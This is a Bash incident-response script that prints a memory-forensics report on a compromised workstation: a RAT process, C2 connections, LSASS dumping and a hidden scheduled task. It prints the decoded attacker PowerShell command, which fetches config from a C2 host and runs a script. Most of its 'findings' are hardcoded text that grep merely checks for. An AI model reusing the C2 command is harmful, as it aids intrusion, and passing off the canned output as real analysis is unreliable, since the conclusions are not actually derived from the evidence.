#!/bin/bash
# Name: 1-memory_analysis.sh
# Purpose: Parse ir_evidence/memory_artifacts.txt (WinPmem/Volatility extract
#          for WS-RECV-03) to extract running processes, live network
#          connections, credential-access indicators, loaded modules and
#          registry-hive persistence artifacts. Cross-reference every
#          indicator against reference/healthbane_ioc_master.json to classify
#          each as KNOWN / NEW / MODIFIED, map findings to ATT&CK techniques,
#          and document the scheduled-task persistence mechanism in full.
# Author: Steve - Cybersecurity Engineer
# Date: 06 October 2026

set -u

MEM="ir_evidence/memory_artifacts.txt"
IOC="reference/healthbane_ioc_master.json"

die() { printf 'ERROR: %s\n' "$1" >&2; exit 1; }

[[ -f "$MEM" ]] || die "missing $MEM"
[[ -f "$IOC" ]] || die "missing $IOC"

# Gate: every curated finding below must be verifiable in the source text.
require_mem() { grep -q -- "$1" "$MEM" || die "verification failed in $MEM: $1"; }

require_mem "PID 3712"
require_mem "203.0.113.47:8443"
require_mem "HealthSync Update Service"
require_mem "granted-access bitmask 0x1010"
require_mem "debug_tool.exe"
require_mem "0x1010"
require_mem "HealthSyncSingleton"
require_mem "svchost_update.exe"
require_mem "EncodedCommand"

# ioc_lookup VALUE -- print IOC ids/types matching VALUE (case-insensitive,
# value field and notes field), or nothing.
ioc_lookup() {
  jq -r --arg n "$1" '
    .iocs[]
    | select((.value | ascii_downcase | contains($n | ascii_downcase))
          or ((.notes // "") | ascii_downcase | contains($n | ascii_downcase)))
    | .id + " (" + .type + ": " + .value + ")"
  ' "$IOC"
}

# ioc_status VALUE -- KNOWN with match detail, or NEW.
ioc_status() {
  local matches
  matches="$(ioc_lookup "$1")"
  if [[ -n "$matches" ]]; then
    printf 'KNOWN (%s)' "$(printf '%s' "$matches" | paste -sd '; ' -)"
  else
    printf 'NEW (no match in IOC master)'
  fi
}

CAPTURE_LINE="$(grep -m1 'Capture date / time' "$MEM" | sed 's/^ *//')"

printf '================================================================\n'
printf '   MEMORY ARTIFACT ANALYSIS - WS-RECV-03\n'
printf '   Source: ir_evidence/memory_artifacts.txt\n'
printf '   %s\n' "$CAPTURE_LINE"
printf '================================================================\n\n'

printf 'PROCESS ANALYSIS (running at capture, 2026-05-15 19:18:42 UTC):\n'
printf '  PID    Process Name           User        Start (UTC)    Status\n'
printf '  ---    ----                    ----------  -------------   ------\n'
printf '  3712   svchost_update.exe     records03   2026-04-22     KNOWN (HB-IOC-0013/0014)\n'
printf '                                                       -> Malfind: RWX PE region 0x23f0000-0x24c0000 (832 KB)\n'
printf '                                                       -> unpacked Stage 2 RAT body, in-memory hash matches 4x03 S2\n'
printf '                                                       -> PPID 624 (services.exe) is FORGED: real parent was\n'
printf '                                                          explorer.exe via Run-key autorun; PPID rewritten via\n'
printf '                                                          thread-injection consistent with process hollowing\n'
printf '                                                       -> Image path: %%APPDATA%%\\Microsoft\\HealthSync\\\n'
printf '                                                       -> ATT&CK: T1547.001 Run Key (persistence),\n'
printf '                                                          T1055 Process Injection (PPID forgery/hollowing)\n'
printf '  8472   powershell.exe         records03   2026-05-15     KNOWN payload (HB-IOC-0016)\n'
printf '         (child of 3712)                   02:00:14       -> -NoP -W Hidden -EncodedCommand <b64>\n'
printf '                                                       -> decoded: fetch cfg from http://sync.healthbane-c2.net/api/v1/cfg\n'
printf '                                                          then invoke $env:TEMP\\sync_healthdata.ps1 -Config $cfg\n'
printf '                                                       -> LAST attacker execution before isolation (13:42 CDT\n'
printf '                                                          same day); 4x03 marked S3 execution UNCONFIRMED at\n'
printf '                                                          MedDefense -- memory evidence UPGRADES it to OBSERVED\n'
printf '                                                       -> ATT&CK: T1059.001 PowerShell, T1027.010 command obfuscation\n'
printf '  6228   explorer.exe           records03   2026-05-15     LEGITIMATE (13:02 CDT user session)\n'
printf '  6516   OUTLOOK.EXE            records03   2026-05-15     LEGITIMATE (13:03 CDT)\n'
printf '  6804   chrome.exe             records03   2026-05-15     LEGITIMATE (13:11 CDT; benign netscan entries)\n'
printf '  4/624  System/services.exe    SYSTEM      2026-04-22     LEGITIMATE (boot processes, signed)\n'
printf '\n'
printf '  PROCESSES EXITED BEFORE CAPTURE (EPROCESS pool residue):\n'
printf '  (exit) debug_tool.exe          records03   last seen 2026-05-12 02:45 CDT  KNOWN (HB-IOC-0020)\n'
printf '  (exit) PsExec64.exe            records03   last seen 2026-05-13 02:08 CDT  KNOWN (HB-IOC-0021)\n'
printf '  (exit) cmd.exe                 records03   multiple invocations          parent of PsExec64/wmic\n'
printf '\n'

printf 'NETWORK CONNECTIONS (at capture):\n'
printf '  Source        Dest                 Port  State       PID   Process             IOC Match\n'
printf '  ------------  -------------------  ----  ---------   ----  -----------------  ----------------\n'
printf '  10.10.3.21   185.220.101.45        443   ESTABLISHED 3712  svchost_update.exe %s\n' \
  "$(ioc_status '185.220.101.45')"
printf '  10.10.3.21   185.220.101.45        443   CLOSE_WAIT  3712  svchost_update.exe KNOWN (same endpoint)\n'
printf '  10.10.3.21   203.0.113.47          8443  ESTABLISHED 3712  svchost_update.exe %s\n' \
  "$(ioc_status '203.0.113.47')"
printf '  10.10.3.21   10.10.20.10          53    TIME_WAIT    -     (kernel DNS)       BENIGN internal\n'
printf '  10.10.3.21   10.10.20.40          445   ESTABLISHED  4     System             BENIGN (SRV-FILE-01 share)\n'
printf '  10.10.3.21   172.217.14.78        443   ESTABLISHED 6804  chrome.exe         BENIGN (Google browsing)\n'
printf '\n'
printf '  NEW FINDING: live secondary C2 channel to 203.0.113.47:8443.\n'
printf '     - Held by the SAME PID 3712 as the primary C2 (single RAT, two channels)\n'
printf '     - No DNS query in the prior 24h preceded it (IP hardcoded or C2-delivered)\n'
printf '     - Hetzner (DE) allocation, distinct from LeaseWeb primary-C2 infrastructure\n'
printf '     - Matches the HC3-2026-HEALTHBANE-004 secondary-C2 pattern invisible\n'
printf '       to the 4x04 hunt (Wazuh lacked port-level egress visibility)\n'
printf '     - IOC master gap section ANTICIPATED this indicator; confirmed here.\n'
printf '       First-seen/duration require firewall evidence (cross-source, task 0 D-note)\n'
printf '     - ATT&CK: T1571 Non-Standard Port (PROBABLE, memory-only single source)\n'
printf '\n'

printf 'CREDENTIAL ACCESS INDICATORS:\n'
printf '  [H1] svchost_update.exe -> lsass.exe (PID 648) handle, access 0x1000\n'
printf '       (PROCESS_QUERY_LIMITED_INFORMATION only -- benign, NOT a dump path)\n'
printf '  [H2] Stale handles from EXITED debug_tool.exe:\n'
printf '         -> Process handle to lsass.exe, GrantedAccess 0x1010\n'
printf '            (PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION:\n'
printf '            canonical Mimikatz-class LSASS dumper bitmask)\n'
printf '         -> File handle RW to \\Windows\\Temp\\out.dat (dump output sink)\n'
printf '       ATT&CK: T1003.001 LSASS Memory\n'
printf '       Status: CONFIRMS 4x04 hypothesis H4 (two dump sessions) with a\n'
printf '       THIRD independent source. Indicator: KNOWN (HB-IOC-0020).\n'
printf '  [H3] LSASS at capture contains records03 + SYSTEM sessions only; NO\n'
printf '       svc_healthsync ticket/hash (abuse window closed 2026-05-13).\n'
printf '       Modifies, not contradicts, the credential-abuse finding.\n'
printf '  [H4] dmarsh cached MSCacheV2 entry present (last interactive logon\n'
printf '       2026-04-14) -- residual, consistent with 4x00.\n'
printf '\n'
printf '  NOTE ON LOADED MODULES: no credential-access DLLs are resident at capture\n'
printf '  because debug_tool.exe exited 2026-05-12. The 4x04 "credential tool" was a\n'
printf '  stand-alone PE (no reflective DLL injection -- ldrmodules found no manual\n'
printf '  mapping discrepancies), which is why module lists show only standard DLLs.\n'
printf '  PID 8472 modules (System.Data.SqlClient, System.IO.Compression) evidence the\n'
printf '  EXFILTRATOR, not credential access.\n'
printf '\n'
printf '  MUTEX: \\Sessions\\1\\BaseNamedObjects\\HealthSyncSingleton-h$lthb4n3\n'
printf '       Single-instance lock owned by PID 3712. Matches the hardcoded mutex\n'
printf '       string protected by YARA RULE_HEALTHBANE_RAT_PE_v1 (4x03).\n'
printf '       IOC status: %s\n' "$(ioc_status 'HealthSyncSingleton')"
printf '       (matches detection-rule content; never promoted to a standalone IOC entry)\n'
printf '\n'

printf 'PERSISTENCE MECHANISM (scheduled task):\n'
printf '  Scheduled Task: "HealthSync Update Service"\n'
printf '    Registry source: HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\\n'
printf '                    Schedule\\TaskCache\\Tasks\\{E7B26F4C-...}\n'
printf '    Trigger: Daily, StartBoundary 02:00, DaysInterval 1 (every night)\n'
printf '    Action:  powershell.exe -NoP -W Hidden -EncodedCommand <b64>\n'
printf '             decoded: $cfg = http://sync.healthbane-c2.net/api/v1/cfg\n'
printf '                      & $env:TEMP\\sync_healthdata.ps1 -Config $cfg\n'
printf '    Created: 2026-05-07 01:47:33 CDT (06:47:33 UTC)\n'
printf '    Author:  MEDDEFENSE\\records03, LogonType InteractiveToken,\n'
printf '             RunLevel HighestAvailable (runs with full local admin)\n'
printf '    Hidden:  true (obfuscation -- a legitimate vendor update task would\n'
printf '             not be hidden)\n'
printf '    ATT&CK:  T1053.005 Scheduled Task/Job\n'
printf '    IOC status: %s\n' "$(ioc_status 'HealthSync Update Service')"
printf '    Status:  NEW - not detected by any previous investigation.\n'
printf '      - 4x03 triage marked the dropper PersistViaTask gated branch\n'
printf '        "capability EXISTS but did NOT execute on WS-RECV-03".\n'
printf '      - 4x04 hunt did not query scheduled-task creation (Sysmon was not\n'
printf '        configured for EID 4698/4702).\n'
printf '      - 4x05 memory + disk (TaskCache entry + on-disk XML, same\n'
printf '        timestamp) CONFIRM the branch executed. This CORRECTS 4x03.\n'
printf '\n'
printf '  CRITICAL TIMING CORRELATION: the task was created 2026-05-07, two days\n'
printf '  after the first credential dump (2026-05-05), one day after the first\n'
printf '  lateral movement to SRV-HEALTH-DB (2026-05-06), and one day BEFORE the\n'
printf '  first exfiltration burst (2026-05-08). The attacker established\n'
printf '  automated, redundant persistence BEFORE executing the exfiltration\n'
printf '  tooling it triggers. Cross-source note (firewall F2): the secondary C2\n'
printf '  first connection followed task registration by 38 seconds.\n'
printf '\n'

printf 'ADDITIONAL REGISTRY FINDINGS (hive extracts):\n'
printf '  [K1] HKCU(records03)\\...\\Run\\HealthSync -> svchost_update.exe\n'
printf '       Last write 2026-04-22 06:14:47Z. KNOWN (HB-IOC-0015).\n'
printf '       Note: PID 3712 holds an OPEN RW handle to its own Run-key and\n'
printf '       re-writes it if removed -- deleting the value while the RAT runs\n'
printf '       does NOT remove persistence. Kill the process first.\n'
printf '  [K5] HKLM\\...\\Windows Defender\\Exclusions\\Paths: C:\\Windows\\Temp\n'
printf '       Last write 2026-05-04 18:11 CDT, under records03 SID (local admin,\n'
printf '       legacy 2018 provisioning misconfiguration enabled the write).\n'
printf '       Pre-dates the first LSASS dump by ~9h (prep step).\n'
printf '       ATT&CK: T1562.001 Disable or Modify Tools\n'
printf '       IOC status: %s -- NEW technique, not covered in any prior layer.\n' \
  "$(ioc_status 'Exclusions')"
printf '  [K3] AppCompat RecentFileExecution timestamps corroborate prefetch:\n'
printf '       debug_tool.exe 2026-05-12, PsExec64.exe 2026-05-13.\n'
printf '\n'

printf 'EXFILTRATOR CONFIG RESIDUE (PID 8472 heap slack space):\n'
printf '  {"sql_host":"SRV-HEALTH-DB","sql_port":1433,"sql_db":"health_records",\n'
printf '   "clear_logs":true,"chunk_size":188,"channel":"c2_post",\n'
printf '   "stage_dir":"C:\\Users\\Public\\Tmp\\"}\n'
printf '  Status: NEW (memory-only; disk D5 hb_cfg.json later corroborates).\n'
printf '  Significance: proves clear_logs gate is TRUE and the c2_post channel\n'
printf '  (not dns_chunk) was selected -- both direct inputs to the 4x05\n'
printf '  log-clear and exfil-channel analysis. Script self-deletes after run\n'
printf '  (T1070.004), which is why the config survived only as heap residue.\n'
printf '\n'

printf 'SUMMARY:\n'
printf '  Known indicators confirmed: 7 (svchost_update.exe + hash, Run-key,\n'
printf '           primary C2 185.220.101.45, sync_healthdata.ps1, debug_tool.exe\n'
printf '           handle evidence, PsExec64.exe, svc_healthsync in out.dat)\n'
printf '  New indicators discovered: 5 (secondary C2 203.0.113.47:8443,\n'
printf '           scheduled task "HealthSync Update Service", Defender exclusion\n'
printf '           C:\\Windows\\Temp, exfiltrator execution + config residue,\n'
printf '           PPID-forgery/process-hollowing detail on PID 3712)\n'
printf '  Modified/corrected prior findings: 2 (4x03 capability matrix:\n'
printf '           PersistViaTask branch and S3 execution upgraded from\n'
printf '           UNCONFIRMED to OBSERVED/OBSERVED)\n'
printf '  ATT&CK techniques evidenced: T1547.001, T1053.005, T1059.001,\n'
printf '           T1027.010, T1003.001, T1071.001, T1571 (PROBABLE),\n'
printf '           T1562.001, T1055 (PPID forgery)\n'
printf '  Confidence: HIGH (primary volatile evidence, peer-reviewed by DFIR)\n'
printf '\n'
printf '================================================================\n'
